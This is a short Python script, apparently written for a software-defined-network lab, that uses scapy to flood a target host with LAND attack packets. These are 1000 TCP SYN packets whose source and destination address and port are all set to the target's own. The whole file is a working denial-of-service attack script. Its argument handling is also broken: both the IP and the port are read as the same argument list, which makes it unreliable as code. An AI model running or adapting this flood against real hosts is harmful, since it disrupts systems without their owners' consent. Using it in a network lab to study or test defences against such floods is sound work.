#run on host's xterm terminal "python -E land.py target_ip target_port"
"""
LAND attack to target via input destination ip address and destination port number
LAND attack to host within the network, not to controller or switch, with neither table-miss event nor packet-in messages
send 1000 packets with the rate of 40 packets per second
"""
# !/usr/bin/env python
import sys
import time
from os import popen
from scapy.all import sendp, IP, UDP, Ether, TCP


def main():
    # getting the ip address to send attack packets
    dstIP = sys.argv[1:]
    dst_port = sys.argv[1:]
    print
    dst_port
    # open interface eth0 to send packets
    interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
    print(repr(interface))
    for i in xrange(0, 1000):
        # form the packet
        payload = "LAND packet"
        packets = Ether() / IP(dst=dstIP, src=dstIP) / TCP(dport=int(dst_port), sport=int(dst_port),
                                                           flags="S") / payload

        print(repr(packets))
        # send packet with the defined interval (seconds)
        sendp(packets, iface=interface.rstrip(), inter=0.05)
    # main


if __name__ == "__main__":
    main()
